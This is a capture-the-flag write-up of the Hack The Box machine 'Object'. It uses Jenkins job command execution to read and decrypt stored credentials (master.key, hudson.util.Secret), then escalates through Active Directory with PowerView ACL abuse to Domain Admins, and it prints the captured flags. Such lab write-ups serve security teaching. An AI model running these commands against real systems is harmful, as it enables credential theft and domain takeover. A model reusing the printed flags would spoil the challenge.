I listed several ports (80,5985, and 8080)
```
Port 80 (http)
Port 5985 (winrm)
Port 8080 (http)
```


I decided to use the "whatweb" tool to gather information about the web services running on port 80 and port 8080

When I checked port 80, I discovered that it had a domain name, so I saved it in my hosts file.
```
❯ whatweb 10.10.11.132
http://10.10.11.132 [200 OK] Country[RESERVED][ZZ], Email[ideas@object.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.132], JQuery[2.1.3], Microsoft-IIS[10.0], Modernizr, Script, Title[Mega Engines]
```


Port 8080 redirected me to a login form, revealing that it was running the "jenkins" application
```
http://10.10.11.132:8080 [403 Forbidden] Cookies[JSESSIONID.6196fb37], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.6196fb37], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]

http://10.10.11.132:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.6196fb37], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.6196fb37], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```

I proceeded to explore the Jenkins application, created an account, and logged in.

Within Jenkins, I found an option to create a New Item and inside these I have the option to  execute Windows batch Command, so I decided to try running "cmd /c whoami"
```
cmd /c whoami
```

I encountered an issue with the "Build in" button, so I decided to explore the "Build periodically" option, which worked similarly to a cron job.
So I made a "cron job" to execute my command
```
*****
```

After a  minute I see my job ready, and in the console output in the options panel I see the result of the command that I inject before "whoami"
```
Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\myProject
[myProject] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins2507289751226796542.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\myProject>cmd /c whoami 
object\oliver
```

But there are a better way to do this, instead of the "Build periodically"  I can make a script in the configuration option "Trigger builds remotely"

```
Add new Token in my profile configuration -> myToken (api token)
create a security identificator in the "Trigger builds remotely" option -> myToken
Use the URL that the "Trigger builds remotely" option give me -> /job/myProject/build?token=myToken
Now make a request with curl
curl -s -X GET "http://kvzlx:11a52f38a1044f36bbb6b96d13c5343572@10.10.11.132:8080/job/myProject/build?token=myToken"
```

Now this is a way to execute remote command
But first I need to check the firewall rules on the victim machine to determine if i'm able to execute a reverse shell

```
myProyect config:
Execute
Windows Command -> cmd /c powershell -C Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True

curl -s -X GET "http://kvzlx:apitoken@10.10.11.132:8080/job/myProject/build?token=myToken"

```

This shows me the firewall rule "BlockOutboundDC"  
Whit this firewall I can't establish a reverse shell. Therefore, I'll attempt to enumerate directories on the victim machine because jenkins has configs files, and there may be credentials or something useful
```
myProyect config:
Execute
Windows Command -> cmd /c powershell -C "cat ../../users/admin_17207690984073220035/config.xml"

curl -s -X GET "http://kvzlx:apitoken@10.10.11.132:8080/job/myProject/build?token=myToken"

```

I have credentials, but I need to decryp them, so I'll use the "jenkins-credentials-decryptor" tool https://github.com/hoto/jenkins-credentials-decryptor
``` bash
curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor

chmod +x jenkins-credentials-decryptor
```

To use this tool, I need the "master.key" and "hudson.util.Secret" files.
I can find these files in the "secrets" directory on the victim machine
```
myProyect config:
Execute
Windows Command -> cmd /c powershell -C "cat ../../secrets/master.key"

curl -s -X GET "http://kvzlx:apitoken@10.10.11.132:8080/job/myProject/build?token=myToken"

nvim master.key
cat master.key | tr -d '\n | sponge master.key'
```

and
```
myProyect config:
Execute
Windows Command -> cmd /c powershell -C [convert]::ToBase64String(("cat ../../secrets/hudson.util.Secret" -Encoding byte)) 

curl -s -X GET "http://kvzlx:apitoken@10.10.11.132:8080/job/myProject/build?token=myToken"

echo "base64string" | base64 -d > hudson.util.Secret
```

I have obtained all the files to decrypt the credentials, now I can execute the script

``` bash
❯ ./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml
[
  {
    "id": "320a60b9-1e5c-4399-8afe-44466c9cde9e",
    "password": "c1cdfun_d2434\u0003\u0003\u0003",
    "username": "oliver"
  }
]
```

I have obtained the credentials, and now I can use the tool "evil-winrm" to establish a connection to the victim's machine using these credentials

``` bash
evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
```

Now that I'm inside the victim machine, I need to escalate privileges

I'll  use the tool sharphound.ps1 to enumerate vectors for privilege escalation https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1

``` bash
evil-winrm cd C:\ProgramData\bh
evil-winrm upload SharpHound.ps1
evil-winrm Import-Module .\SharpHound.ps1
evil-winrm Invoke-BloodHound -CollectionMethod ALL
evil-winrm download BloodHound.zip

# on my machine
neo4j console
bloodhound
```

Bloodhound reveals that the user Oliver can change the password of the user Smith (ForceChangePassword)

``` powershell
evil-winrm > $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
evil-winrm > upload powerview.ps1
evil-winrm > Import-Module .\powerview.ps1
evil-winrm > Set-DomainUserPassword -Identity smith -AccountPassword $SecPassword
```

Now I have access as the user smith using evil-winrm
``` bash
evil-winrm -i 10.10.11.132 -u 'smith' -p 'Password123!'
```

Looking at the bloodhound information, Now as the user Smith I have the privilege "GenericWrite" for the user Maria
This allows me to change attributes for the user Maria
Whit this privilege, I can abuse the logon script attribute

``` powershell
evil-winrm > Import-Module .\powerview.ps1
evil-winrm > echo 'dir C:\Users\Maria\Desktop\ > C:\ProgramData\bh\output.txt' > test.ps1
evil-winrm > Set-DomainObject -Identity maria -SET @{scriptpath='C:\ProgramData\bh\test.ps1'}
``` 

I'm viewing a excel file from the user Maria, leveraging the "GenericWrite/logon script" exploit
Now I'll copy that file to my directory and next download it

``` bash
echo 'copy C:\Users\Maria\Desktop\Engines.xls C:\ProgramData\bh\Engines.xls' > test.ps1

```

this excel file contains credentials for Maria

``` bash
evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
```

Now I'm accessing as the user maria

Regarding the bloodhound information, Maria has the privilege "WriteOwner" on the  Domain Admins

``` powershell
evil-winrm > Import-Module .\powerview.ps1
evil-winrm > Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity Maria
evil-winrm > Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity Maria
evil-winrm > net group "Domain Admins" Maria /add /domain
``` 

Now  the user Maria is in the Admin group, and I can get the root flag and terminate the Object machine from Hack The Box


User flag > a12c80de6fd4225e3a33730c83673657
User root > ecef05e90ac301a571e9b471e5426f4a
